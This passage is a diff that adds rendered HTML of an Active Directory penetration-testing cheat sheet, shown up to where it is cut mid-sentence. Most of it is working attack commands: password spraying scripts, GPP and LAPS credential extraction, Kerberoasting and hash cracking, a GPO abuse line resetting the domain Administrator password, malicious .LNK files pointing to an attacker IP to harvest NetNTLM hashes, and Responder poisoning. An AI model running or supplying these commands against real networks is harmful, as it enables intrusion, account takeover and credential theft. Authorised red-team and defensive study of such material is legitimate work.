+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>nltest /dsgetsite
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>nltest /whowill:&lt;domain&gt; &lt;user&gt;
+</span></code></pre></div>
+<h3 id="domain-policy-using-powerview">Domain policy using PowerView</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Get-DomainPolicy
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>(Get-DomainPolicy).&quot;System Access&quot;
+</span></code></pre></div>
+<h3 id="getting-password-policy">Getting password policy</h3>
+<p>Get domain password policy using <strong>ActiveDirectory</strong> module. (<a href="https://4sysops.com/wiki/how-to-install-the-powershell-active-directory-module/">RSAT</a>)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property DisplayName, State
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Get-ADDefaultDomainPasswordPolicy
+</span></code></pre></div></p>
+<p>Get all domain fined grained password policy
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Get-ADFinedGrainedPasswordPolicy -Filter *
+</span></code></pre></div></p>
+<p>Get password policy for specific user
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Get-ADUserResultantPasswordPolicy -Identity john.doe
+</span></code></pre></div></p>
+<h3 id="misc-enumeration-commands">MISC Enumeration commands</h3>
+<p>Recursive search for <em>Domain Admins</em> members
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>dsquery group -name &quot;Domain Admins&quot; | dsget group -expand -members
+</span></code></pre></div></p>
+<h3 id="get-net-session">Get Net session</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Get-NetComputer | Get-NetSession
+</span></code></pre></div>
+<h3 id="review-smb-share-rights">Review SMB Share rights</h3>
+<ul>
+<li>https://github.com/NetSPI/PowerHuntShares</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\temp\test -Credentials domain\user
+</span></code></pre></div>
+<h3 id="active-directory-user-and-computer-account-description">Active Directory user and computer account description</h3>
+<p>Using crackmapexec to get active directory user description
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M get-desc-users
+</span></code></pre></div></p>
+<p>--&gt; It is also extremely important to check for computer account description, as computer account are just AD object with description attribute.</p>
+<h3 id="resetting-expired-passwords-remotely">Resetting expired passwords remotely</h3>
+<ul>
+<li>https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/</li>
+</ul>
+<h3 id="passwd_not_reqd">PASSWD_NOT_REQD</h3>
+<p>If PASSWD_NOTREQD user-Account-Control Attribute Value bit is set then No password is required.  </p>
+<p>1) First collect the information from the domain controller:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>python ldapdomaindump.py -u example.com\\john -p pass123 -d &#39;;&#39; 10.100.20.1
+</span></code></pre></div></p>
+<p>2) Once the dumping is done, get the list of users with the PASSWD_NOTREQD flag using the following command:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>grep PASSWD_NOTREQD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F &#39;;&#39; &#39;{print $3}&#39;
+</span></code></pre></div></p>
+<p>Reset password of users who have PASSWD_NOTREQD flag set and have never set a password:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>Get-ADUser -Filter &quot;useraccountcontrol -band 32&quot; -Properties PasswordLastSet | Where-Object { $_.PasswordLastSet -eq $null } | select SamAccountName,Name,distinguishedname | Out-GridView
+</span></code></pre></div></p>
+<h3 id="machine-account-quota">Machine Account Quota</h3>
+<p>Identify machine account quota domain attribute:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>crackmapexec ldap 192.168.0.10 -u jdoe -H XXXXXX:XXXXXXX -M MAQ --kdcHost corp.company.local
+</span></code></pre></div></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+</span></code></pre></div>
+<h3 id="laps-laps-bypass">LAPS / LAPS bypass</h3>
+<p>Retrieving LAPS passwords using Crackmapexec
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>crackmapexec ldap 192.168.0.10 -u jdoe -H XXXXX:XXXXX -M laps --kdcHost corp.company.local
+</span></code></pre></div></p>
+<h3 id="admin-count">Admin Count</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>crackmapexec ldap company.com -u &#39;jdoe&#39; -p &#39;Pass1234&#39; -d company.com --admin-count
+</span></code></pre></div>
+<h3 id="checking-gpp-passwords">Checking GPP passwords</h3>
+<ul>
+<li>https://pentestlab.blog/tag/gpp/
+Using crackmapexec GPP module
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_password
+</span></code></pre></div></li>
+</ul>
+<p>Using Impackets Get-GPPPassword.py
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>python3 Get-GPPPassword.py company.com/jdoe:Pass1234@10.10.0.10
+</span></code></pre></div></p>
+<p>Using Metasploit module
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>use auxiliary/scanner/smb/smb_enum_gpp
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>msf auxiliary(smb_enum_gpp) &gt; set rhosts 192.168.0.10
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>msf auxiliary(smb_enum_gpp) &gt; set smbuser jdoe
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>msf auxiliary(smb_enum_gpp) &gt; set smbpass Pass1234
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>msf auxiliary(smb_enum_gpp) &gt; exploit
+</span></code></pre></div></p>
+<h3 id="checking-gpp-autologin">Checking GPP autologin</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_autologin
+</span></code></pre></div>
+<h3 id="checking-share">Checking share</h3>
+<p>Checking share access rights with domain user
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com --shares
+</span></code></pre></div></p>
+<p>Complete review of network share permissions.<br />
+--&gt; <a href="https://github.com/NetSPI/Powerhuntshares">Powerhuntshare</a> can be run from domain or non domain joined machine.</p>
+<ul>
+<li>https://www.netspi.com/blog/technical/network-penetration-testing/network-share-permissions-powerhuntshares/</li>
+</ul>
+<p>Running Powerhuntshare from domain joined machine.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\temp\test
+</span></code></pre></div></p>
+<h3 id="print-spooler-service">Print spooler service</h3>
+<p>Checking if print spooler service is enable using impacket RPCDUMP or crackmapexec (used RPCDUMP but can be used to scan on large range)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>python3 rpcdump.py company.com/jdoe:Pass1234@10.10.0.10 | grep &#39;MS-RPRN\|MS-PAR&#39;
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>crackmapexec smb rangeIP.txt -u jdoe -p Pass1234 -d company.com -M spooler | grep Spooler
+</span></code></pre></div></p>
+<h3 id="local-admin-brute-force">Local admin brute force</h3>
+<ul>
+<li>https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/localbrute.ps1 (a améliorer)</li>
+</ul>
+<h3 id="pywerview-recon-tool">Pywerview recon tool</h3>
+<p>PowerView's functionalities in Python, using the wonderful impacket library.
+- https://github.com/the-useless-one/pywerview</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>python pywerview.py get-netuser -w company.local -u jdoe --dc-ip 192.168.0.10 --username jdoe
+</span></code></pre></div>
+<h3 id="reconenumeration-using-bloodhound">Recon/Enumeration using BloodHound</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>. .\SharpHound.ps1
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>Invoke-BloodHound -CollectionMethod All
+</span></code></pre></div>
+<h3 id="expanding-bloodhound">Expanding BloodHound</h3>
+<ul>
+<li>https://github.com/hausec/Bloodhound-Custom-Queries</li>
+<li>https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/</li>
+<li>https://www.trustedsec.com/blog/expanding-the-hound-introducing-plaintext-field-to-compromised-accounts/</li>
+<li>https://neo4j.com/docs/api/python-driver/current/</li>
+</ul>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="identifying-quick-wins">Identifying Quick Wins</h3>
+<ul>
+<li>Tomcat</li>
+<li>JavaRMI</li>
+<li>WebLogic</li>
+<li>Jboss</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>nmap -p 8080,1098,1099,1050,8000,8888,8008,37471,40259,9010,7001 -iL ips.txt -oN tomcat_rmi_jboss.txt -sV
+</span></code></pre></div>
+<h3 id="adpeas">adPeas</h3>
+<ul>
+<li>https://github.com/61106960/adPEAS</li>
+</ul>
+<h3 id="password-spray">Password spray</h3>
+<ul>
+<li>https://github.com/Greenwolf/Spray/blob/master/spray.sh</li>
+</ul>
+<p>Spraying 3 password attempt for each user every 15 minutes without attempting password=username<br />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 corp.company.local NOUSERUSER
+</span></code></pre></div></p>
+<ul>
+<li>https://github.com/ShutdownRepo/smartbrute</li>
+</ul>
+<h3 id="force-authentication">Force Authentication</h3>
+<ul>
+<li>https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication</li>
+<li>https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/</li>
+</ul>
+<p>.SCF, .URL, .RTF, .XML, </p>
+<h4 id="lnk-files">LNK Files</h4>
+<p>If you get access to a share we can create a malicious .LNK file. This .LNK file will includes a refernece to the attacker computers.
+You can after choose to Relay the <em>NetNTLM</em> hash or crack it.</p>
+<ul>
+<li>https://github.com/Plazmaz/LNKUp
+Use --execute to specify a command to run when the shortcut is double clicked 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>lnkup.py --host attackerIP --type ntlm --output out.lnk --execute &quot;shutdown /s&quot;
+</span></code></pre></div></li>
+</ul>
+<p>Using PowerShell
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>$objShell = New-Object -ComObject WScript.Shell
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>$lnk = $objShell.CreateShortcut(&quot;C:\Malicious.lnk&quot;)
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>$lnk.TargetPath = &quot;\\&lt;attackerIP&gt;\@file.txt&quot;
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>$lnk.WindowStyle = 1
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>$lnk.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>$lnk.Description = &quot;LNK file&quot;
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>$lnk.HotKey = &quot;Ctrl+Alt+O&quot;
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>$lnk.Save()
+</span></code></pre></div></p>
+<h3 id="potatoes-attacks">Potatoes Attacks</h3>
+<h4 id="ghost-potato">Ghost potato</h4>
+<p>https://shenaniganslabs.io/files/impacket-ghostpotato.zip</p>
+<h4 id="remote-potato">Remote Potato</h4>
+<p>https://github.com/antonioCoco/RemotePotato0/</p>
+<h4 id="juicy-potato">Juicy Potato</h4>
+<p>https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505</p>
+<h4 id="hot-potato">Hot Potato</h4>
+<p>https://pentestlab.blog/2017/04/13/hot-potato/</p>
+<h4 id="sweet-potato">Sweet Potato</h4>
+<p>https://www.pentestpartners.com/security-blog/sweetpotato-service-to-system/</p>
+<p>https://www.ctfnote.com/red-teaming/privilege-escalation/windows-privilege-escalation/token-impersonation-and-potato-attacks</p>
+<h4 id="god-potato">God Potato</h4>
+<p>https://github.com/BeichenDream/GodPotato</p>
+<h3 id="rpc-misc">RPC Misc</h3>
+<h5 id="ad-user-password-modification-using-rpcclient">AD user password modification using rpcclient</h5>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>user@host # rpcclient -U supportAccount //192.168.0.100
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>[...] authenticate using the supportAccount password which needs to be modified
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>rpcclient $&gt; setuserinfo2 supportAccount 23 SuperNewPassword22
+</span></code></pre></div>
+<p>--&gt; Note : If package passing-the-hash is installed on attacker machine, you can even do this with just a NTLM hash. (Flag : --pw-nt-hash)</p>
+<h5 id="rpc-password-spraying">RPC password spraying</h5>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>while read x; do echo $x; rpcclient -U “DOMAIN/$x%PasswOrd123” -c “getusername;quit” 192.168.0.110; done &lt; ./userlist.txt
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>Using bash script:
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>#/bin/bash
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>for u in &#39;cat dom_users.txt&#39;
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>do echo -n &quot;[*] user: $u&quot; &amp;&amp; rpcclient -U &quot;$u%password&quot; -c &quot;getusername;quit&quot; 10.10.10.192
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>done
+</span></code></pre></div>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>Service Principal Names (SPN's) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).  </p>
+<p>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>GetUserSPNs.py -request -dc-ip 192.168.1.10 COMPANY.LOCAL/jdoe:PasswordJdoe123 -outputfile hashes.kerberoast
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+</span></code></pre></div>
+<p>--&gt; To protect against this attack, we must avoid having <em>SPN</em> on user accounts, in favor of machine accounts.<br />
+--&gt; If it is necessary, we should use Microsoft’s Managed Service Accounts (MSA) feature, ensuring that the account password is robust and changed regularly and automatically</p>
+<h3 id="kerberos-delegation">Kerberos Delegation</h3>
+<ul>
+<li>https://www.youtube.com/watch?v=7_iv_eaAFyQ</li>
+</ul>
+<h3 id="kerberos-bronze-bit">Kerberos Bronze Bit</h3>
+<p>https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-overview/
+https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/
+https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-attack/</p>
+<h3 id="abusing-vulnerable-gpo">Abusing Vulnerable GPO</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>\SharpGPOAbuse.exe --AddComputerTask --Taskname &quot;Update&quot; --Author DOMAIN\&lt;USER&gt; --Command &quot;cmd.exe&quot; --Arguments &quot;/c net user Administrator Password!@# /domain&quot; --GPOName &quot;ADDITIONAL DC CONFIGURATION&quot;
+</span></code></pre></div>
+<h3 id="abusing-ms-sql-service">Abusing MS-SQL Service</h3>
+<ul>
+<li>https://www.offsec-journey.com/post/attacking-ms-sql-servers</li>
+<li>https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>. ./PowerUPSQL.ps1
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>Get-SQLInstanceLocal -Verbose
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>(Get-SQLServerLinkCrawl -Verbose -Instance &quot;10.10.10.20&quot; -Query &#39;select * from master..sysservers&#39;).customquery 
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>Import-Module .\powercat.ps1 powercat -l -v -p 443 -t 10000
+</span></code></pre></div>
+<h3 id="relay-attacks">Relay attacks</h3>
+<p><img src="./images/smb_relay.png" width="700"/></p>
+<h4 id="netntlmv1-downgrade-attack">NetNTLMv1 Downgrade attack</h4>
+<ul>
+<li>https://www.r-tec.net/r-tec-blog-netntlmv1-downgrade-to-compromise.html</li>
+</ul>
+<h4 id="stealing-netntlm-hashes-via-outlook-signatures">Stealing NetNTLM hashes via outlook signatures</h4>
+<ul>
+<li>https://research.nccgroup.com/2021/01/15/sign-over-your-hashes-stealing-netntlm-hashes-via-outlook-signatures/</li>
+<li>https://github.com/nccgroup/nccfsas/tree/main/Tools/Sigwhatever</li>
+</ul>
+<h3 id="drop-the-mic-cve-2019-1040">Drop the MIC CVE-2019-1040</h3>
+<ul>
+<li>https://securityboulevard.com/2019/06/drop-the-mic-cve-2019-1040/</li>
+</ul>
+<h3 id="exploiting-acl-over-gpo">Exploiting ACL over GPO</h3>
+<ul>
+<li>https://github.com/Group3r/Group3rhttps://github.com/Group3r/Group3r</li>
+</ul>
+<h3 id="insecure-ldap-ldaps-signing-channel-binding">Insecure LDAP: LDAPS / Signing / Channel Binding</h3>
+<p>Insecure LDAP traffic can exposed clients to multiple vulnerabilities and exploitation path such as:
+- Unencrypted LDAP (LDAPS) : Credential and authentication interception (port TCP-UDP/389)
+- LDAP Signing disable : LDAP Relay attack (such as SMB Relay but using LDAP)
+- LDAP Channel Binding : </p>
+<h4 id="ldaps">LDAPS</h4>
+<p>Domain controllers and clients are in constant exchange and use the LDAP protocol, which communicates via port 389 (TCP and UDP).</p>
+<p>In case a customer use LDAP (389) instead of LDAPS (636) you will be able to intercept authentication and credentials.</p>
+<p>Why LDAPS is not deployed everywhere:
+- Not all devices are compatible with it (Old telephone systems or legacy applications)
+- Small</p>
+<p><em>Note:</em> If SSL is used you can try to make MITM offering a false certificate, if the user accepts it, you are able to <em>Downgrade the authentication method</em> and see the credentials again.</p>
+<h4 id="ldap-signing-disable">LDAP Signing disable</h4>
+<p>LDAP signing adds a digital signature to the connection. It ensures the authenticity and integrity of the transmitted data. This means that the recipient can verify the sender and determine whether the data has been manipulated along the way.</p>
+<p>In case LDAP signing is not enable it is possible to relay a valid LDAP session using <em>ntlmrelayx</em> for example.
+The LDAP relay attack will give you the ability to perform multiple action such as :</p>
+<ul>
+<li>Dumping LDAP information (ActiveDirectory users/groups/computers information)</li>
+<li>In case the relayed session is from a <em>Domain Admins</em> user you will be able to directly persiste and create a new <em>Domain Admins</em> user.</li>
+<li></li>
+</ul>
+<p>Validate LDAP signing is not enforced
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>crackmapexec ldap domain_controllers.txt -u jdoe -p Password123 -M ldap-signing
+</span></code></pre></div></p>
+<h4 id="ldap-channel-binding">LDAP Channel Binding</h4>
+<p>Channel binding is the act of binding the transport layer and application layer together. In the case of LDAP channel binding, the TLS tunnel and the LDAP application layer are being tied together. When these two layers are tied together it creates a unique fingerprint for the LDAP communication. Any interception of the LDAP communications cannot be re-used as this would require establishing a new TLS tunnel which would invalidate the LDAP communication’s unique fingerprint.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>python3 LdapRelayScan.py -dc-ip 192.168.0.10 -u jdoe -p Password123
+</span></code></pre></div>
+<h3 id="unencrypted-protocols-in-use">Unencrypted Protocols in use</h3>
+<h4 id="smtp">SMTP</h4>
+<p>Port 25</p>
+<h4 id="http">HTTP</h4>
+<p>Port 80</p>
+<h4 id="telnet">Telnet</h4>
+<p>Port 23</p>
+<h4 id="ftp">FTP</h4>
+<p>Port 21</p>
+<h5 id="ldap">LDAP</h5>
+<p>LDAPS uses its own distinct network port to connect clients and servers. The default port for LDAP is port 389, but LDAPS uses port 636 and establishes TLS/SSL upon connecting with a client.</p>
+<h3 id="sysvol-gpp">SYSVOL / GPP</h3>
+<ul>
+<li>https://adsecurity.org/?p=2288</li>
+</ul>
+<p><em>From Windows client perspective</em>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml
+</span></code></pre></div></p>
+<p>The PowerSploit function Get-GPPPassword is most useful for Group Policy Preference exploitation.<br />
+- <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a></p>
+<p><em>From Linux client</em>  </p>
+<h5 id="metasploit-module">Metasploit Module</h5>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>use auxiliary/scanner/smb/smb_enum_gpp
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>msf auxiliary(smb_enum_gpp) &gt; set rhosts 192.168.1.103
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>msf auxiliary(smb_enum_gpp) &gt; set smbuser raj
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>msf auxiliary(smb_enum_gpp) &gt; set smbpass Ignite@123
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>msf auxiliary(smb_enum_gpp) &gt; exploit
+</span></code></pre></div>
+<h5 id="metasploit-post-module-once-you-get-shell-on-windows-host">Metasploit Post-Module : Once you get shell on windows host</h5>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>use post/windows/gather/credentials/gpp
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>msf post(windows/gather/credentials/gpp) &gt; set session 1
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>msf post(windows/gather/credentials/gpp) &gt; exploit
+</span></code></pre></div>
+<h5 id="crackmapexec-module-1-gpp_password">CrackMapExec Module 1 : gpp_password</h5>
+<p>Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>crackmapexec smb 192.168.0.10 -u jdoe -p Password 123 -M gpp_pasword
+</span></code></pre></div></p>
+<h5 id="crackmapexec-module-2-gpp_autologin">CrackMapExec Module 2: gpp_autologin</h5>
+<p>Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>crackmapexec smb 192.168.0.10 -u jdoe -p Password 123 -M gpp_autologin
+</span></code></pre></div></p>
+<h5 id="impacket-module">Impacket Module</h5>
+<p>Breadth-first search algorithm to recursively find .xml extension files within SYSVOL.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>Get-GPPPassword.py company.local/jdoe:Password123@192.168.0.10&#39;
+</span></code></pre></div></p>
+<h5 id="decrypt-the-found-password-manually">Decrypt the found password manually</h5>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>gpp-decrypt &lt;encrypted cpassword&gt;
+</span></code></pre></div>
+<h3 id="llmnr-nbt-ns-mdns">LLMNR / NBT-NS / mDNS</h3>
+<blockquote>
+<p>Microsoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network.</p>
+</blockquote>
+<h4 id="responder-ntlmrelayx">Responder + ntlmrelayx</h4>
+<p>It is possible to directly relay NetNTLM has to SMB/LDAP/HTTP and DNS session over a victim. If the victim has SMB and/or LDAP signing activated try to relay on other protocols than SMB or LDAP.</p>
+<p>Poisoning LLMNR/NetBios-NS response
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>python3 Responder.py -I eth0 -wbF
+</span></code></pre></div></p>
+<p>Relay over smb to 192.168.0.10, with smb2 support, socks enable, interactive mode and dumping the NetNTLM relayed hash in option
